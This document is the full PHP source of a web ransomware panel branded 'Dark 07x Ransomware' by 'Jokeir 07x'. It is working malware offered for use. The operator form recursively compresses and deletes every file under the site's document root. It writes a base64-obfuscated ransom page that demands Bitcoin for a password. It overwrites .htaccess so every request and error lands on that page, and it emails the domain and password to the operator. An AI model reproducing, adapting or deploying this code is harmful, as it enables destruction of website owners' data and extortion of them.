<title>Hacked By Jokeir 07x</title>
<link rel="shortcut icon" type="image/x-icon" href="https://g.top4top.io/p_31769cgq11.jpeg">
<style>
html {
    background: url('https://e.top4top.io/p_31763qqk31.gif') no-repeat center center fixed;
    background-size: cover;
    color: green;
}
input { 
    background: transparent; 
    color: white; 
    border: 1px solid white; 
}
</style>
<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
if(isset($_POST['pass'])) {
function encfile($filename){
	if (strpos($filename, '.crypt') !== false) {
    return;
	}
	file_put_contents($filename.".crypt", gzdeflate(file_get_contents($filename), 9));
	unlink($filename);
copy('.htaccess','.htabackup');
$file = base64_decode("PHRpdGxlPkRhcmsgMDd4IFJhbnNvbXdhcmU8L3RpdGxlPgo8bGluayByZWw9InNob3J0Y3V0IGljb24iIHR5cGU9ImltYWdlL3gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9nLnRvcDR0b3AuaW8vcF8zMTc2OWNncTExLmpwZWciPgo8c3R5bGU+Cmh0bWwgewogIGJhY2tncm91bmQ6IHVybCgnaHR0cHM6Ly9lLnRvcDR0b3AuaW8vcF8zMTc2M3FxazMxLmdpZicpIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyIGZpeGVkOwogIGJhY2tncm91bmQtc2l6ZTogY292ZXI7CiAgY29sb3I6IGdyZWVuOwp9CmlucHV0IHsKICBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsKICBjb2xvcjogd2hpdGU7CiAgYm9yZGVyOiAxcHggc29saWQgd2hpdGU7Cn0KPC9zdHlsZT4KPD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwokaW5wdXQgPSAkX1BPU1RbJ3Bhc3MnXTsKJHBhc3MgPSAiamFuY29ramFyYW4iOwppZihpc3NldCgkaW5wdXQpKSB7CiAgaWYobWQ1KCRpbnB1dCkgPT0gJHBhc3MpIHsKICAgIGZ1bmN0aW9uIGRlY2ZpbGUoJGZpbGVuYW1lKXsKICAgICAgaWYgKHN0cnBvcygkZmlsZW5hbWUsICcuY3J5cHQnKSA9PT0gRkFMU0UpIHsKICAgICAgICByZXR1cm47CiAgICAgIH0KICAgICAgJGRlY3J5cHRlZCA9IGd6aW5mbGF0ZShmaWxlX2dldF9jb250ZW50cygkZmlsZW5hbWUpKTsKICAgICAgZmlsZV9wdXRfY29udGVudHMoc3RyX3JlcGxhY2UoJy5jcnlwdCcsICcnLCAkZmlsZW5hbWUpLCAkZGVjcnlwdGVkKTsKICAgICAgdW5saW5rKCdjcnlwdC5waHAnKTsKICAgICAgdW5saW5rKCcuaHRhY2Nlc3MnKTsKICAgICAgdW5saW5rKCRmaWxlbmFtZSk7CiAgICAgIGVjaG8gIiRmaWxlbmFtZSBEZWNyeXB0ZWQgISEhPGJyPiI7CiAgICB9CgogICAgZnVuY3Rpb24gZGVjZGlyKCRkaXIpewogICAgICAkZmlsZXMgPSBhcnJheV9kaWZmKHNjYW5kaXIoJGRpciksIGFycmF5KCcuJywgJy4uJykpOwogICAgICBmb3JlYWNoKCRmaWxlcyBhcyAkZmlsZSkgewogICAgICAgIGlmKGlzX2RpcigkZGlyLiIvIi4kZmlsZSkpewogICAgICAgICAgZGVjZGlyKCRkaXIuIi8iLiRmaWxlKTsKICAgICAgICB9ZWxzZSB7CiAgICAgICAgICBkZWNmaWxlKCRkaXIuIi8iLiRmaWxlKTsKICAgICAgICB9CiAgICAgIH0KICAgIH0KCiAgICBkZWNkaXIoJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSk7CiAgICBlY2hvICI8YnI+V2Vicm9vdCBEZWNyeXB0ZWQ8YnI+IjsKICAgIHVubGluaygkX1NFUlZFUlsnUEhQX1NFTEYnXSk7CiAgICB1bmxpbmsoJy5odGFjY2VzcycpOwogICAgY29weSgnaHRhYmFja3VwJywnLmh0YWNjZXNzJyk7CiAgICBlY2hvICdTdWNjZXNzICEhISc7CiAgfSBlbHNlIHsKICAgIGVjaG8gJ0ZhaWxlZCBQYXNzd29yZCAhISEnOwogIH0KICBleGl0KCk7Cn0KPz4KPGNlbnRlcj4KPGgxPkRhcmsgMDd4IFJhbnNvbXdhcmU8L2gxPgo8aW1nIGhlaWdodD0iMjAwIiBzcmM9Imh0dHBzOi8vZy50b3A0dG9wLmlvL3BfMzE3NjljZ3ExMS5qcGVnIi8+Cjxicj48YnI+CjxoMz5Zb3VyIFdlYnNpdGUgSXMgRW5jcnlwdGVkIEJ5IEpva2VpciAwN3g8L2gzPgoKRG9uJ3QgQ2hhbmdlIHRoZSBGaWxlbmFtZSBiZWNhdXNlIGl0IENhbiBEYW1hZ2UgdGhlIEZpbGUgSWYgWW91IFdhbnQgdG8gUmV0dXJuIFlvdSBNdXN0IEVudGVyIHRoZSBQYXNzd29yZCBGaXJzdAo8YnI+ClNlbmQgTWUgJDMgRm9yIEJhY2sgWW91ciBXZWJzaXRlIChEb24ndCBwbGF5IHdpdGggZmlyZSkgPGJyPjxicj4KQml0Y29pbiBBZGRyZXNzIDogPGlucHV0IHR5cGU9InRleHQiIHZhbHVlPSJXbGVjb21lIFRvIERhcmsgMDd4IiByZWFkb25seT4KPGJyPjxicj4KPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbWV0aG9kPSJwb3N0Ij4KPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InBhc3MiIHBsYWNlaG9sZGVyPSJQYXNzd29yZCI+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJEZWNyeXB0Ij4KPC9mb3JtPgo8YnI+Q29udGFjdCBNYWlsIDogSm9rZWlyeEBnbWFpbC5jb20K");
$q = str_replace('dark07x', md5($_POST['pass']), $file);
$w = str_replace('jokeirx@gmail.com', $_POST['email'], $q);
$e = str_replace('jokeir07x', $_POST['btc'], $w);
$r = str_replace('$3', '$'.$_POST['price'], $e);
$dec = $r;
$comp = "<?php eval('?>'.base64_decode("."'".base64_encode($dec)."'".").'<?php '); ?>";
$cok = fopen('crypt.php', 'w');
fwrite($cok, $comp);
fclose($cok);
$hta = "DirectoryIndex crypt.php\n
ErrorDocument 403 /crypt.php\n
ErrorDocument 404 /crypt.php\n
ErrorDocument 500 /crypt.php\n";
$ht = fopen('.htaccess', 'w');
fwrite($ht, $hta);
fclose($ht);
echo "$filename Encrypted !!!<br>";
}

function encdir($dir){
	$files = array_diff(scandir($dir), array('.', '..'));
		foreach($files as $file) {
			if(is_dir($dir."/".$file)){
				encdir($dir."/".$file);
			} else {
				encfile($dir."/".$file);
				
		}
	}
}

if(isset($_POST['pass'])){
	encdir($_SERVER['DOCUMENT_ROOT']);
}
copy('crypt.php', $_SERVER['DOCUMENT_ROOT'].'/crypt.php');
copy('.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htaccess');
copy($_SERVER['DOCUMENT_ROOT'].'.htaccess', $_SERVER['DOCUMENT_ROOT'].'.htabackup');
$to = $_POST['email'];
$subject = 'Your Ransomware Info';
$message = "Domain : ".$_SERVER['HTTP_ADDR']."\n\n"."Your Password : ".$_POST['pass'];
if(mail($to,$subject,$message)) {
echo 'Password Saved In Your Mail !!!';
} else {
echo 'Password Not In Your Mail !!!';
}
exit();
}
?>
<center>
<h1>Welcome To Dark 07x Ransomware</h1>
<img height="200" src="https://g.top4top.io/p_31769cgq11.jpeg"/>
<br><br><h3>Information Server :</h3>
Path File : <font color="red"><?php echo $_SERVER['SCRIPT_FILENAME'] ; ?></font><br>
Disable Function : <font color="red"><?php $ds = @ini_get("disable_functions"); $show_ds = (!empty($ds)) ? "$ds" : "NONE"; echo $show_ds; ?></font>
Mail Function : <font color="red"><?php if(mail('jokeirx@gmail.com','tes','tes')) { echo "ON"; } else { echo "ON"; } ?></font>
<br><Br>
<form enctype="multipart/form-data" method="post">
Password Encrypt : <input type="text" name="pass"> Your Email : <input type="text" name="email">
<br><br>
Your Bitcoin Address : <input type="text" name="btc"> Your Price : <input type="text" name="price">
<br><br>
<input type="submit" value="Encrypt">
</form>
